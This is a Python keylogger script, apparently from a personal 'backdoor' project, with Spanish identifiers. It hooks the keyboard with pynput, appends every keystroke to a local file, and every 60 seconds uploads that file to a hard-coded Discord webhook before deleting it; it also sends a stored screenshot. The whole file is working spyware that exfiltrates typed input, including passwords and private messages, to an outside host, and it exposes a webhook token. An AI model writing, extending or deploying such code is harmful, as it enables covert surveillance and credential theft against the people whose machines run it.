from tkinter import S
from numpy import printoptions
from pynput.keyboard import Listener
from dhooks import Webhook, Embed, File
import os
from pynput.keyboard import Listener
import sys
import time
#from PIL import Image

WEBHOOK_URL = "https://discord.com/api/webhooks/969380519013916742/d8wxj_M_1CkRWRTljL-b9P347KAlxjpM1MBMD0pogEWZAjMVg75dsHP7KWejrtAsql2H"  # Your discord webhook url goes here.

image1 = 'https://i.imgur.com/rdm3W9t.png'
image2 = 'https://i.imgur.com/f1LOr4q.png'
#im = Image.open('./monitor-0.png')
global interval, start_time
interval =60


file2 = File(r'C:\Users\simbionte\Documents\backdoor\monitor-0.png', name='datos.png')
embed = Embed(
    description='This is the **description** of the embed! :smiley:',
    color=0x5CDBF0,
    timestamp='now'  # sets the timestamp to current time
    )
embed.set_author(name='Author Goes Here', icon_url=image1)
embed.add_field(name='Test Field', value='Value of the field :open_mouth:')
embed.add_field(name='Another Field', value='1234 :smile:')
embed.set_footer(text='Here is my footer text', icon_url=image1)
embed.set_thumbnail(image1)
embed.set_image(image2)

def enviarWebho(webhook):
    webhook=Webhook(webhook)
    webhook.send(embed=embed)
    webhook.send("mire perro",file2=file2)

def enviarfiles():
    file = File(r'datos.txt', name='datos.txt')
    webhooker=Webhook("https://discord.com/api/webhooks/969380519013916742/d8wxj_M_1CkRWRTljL-b9P347KAlxjpM1MBMD0pogEWZAjMVg75dsHP7KWejrtAsql2H")
    webhooker.send(file=file)
    os.remove("datos.txt")
    


""" log=keyboard.read_key()
print("hasprecionado la tecla:",log) """

def captura(jey):
    global start_time        
    tecla=str(jey)
    tecla=tecla.replace("'","")    
    if tecla=='Key.space':
        tecla=' '
    if tecla=='Key.enter':
        tecla="\n"
    if tecla=='Key.esc':
        sys.exit()
    #print("Evento: ",tecla)  
    with open("datos.txt",'a')as f:
        f.write(tecla)      
    if int(time.time() - start_time) > int(interval):       
       enviarfiles()
       start_time = time.time()

    
start_time=time.time()
with Listener(on_press=captura)as c:
    c.join()

#enviarWebho(WEBHOOK_URL)
#im.show()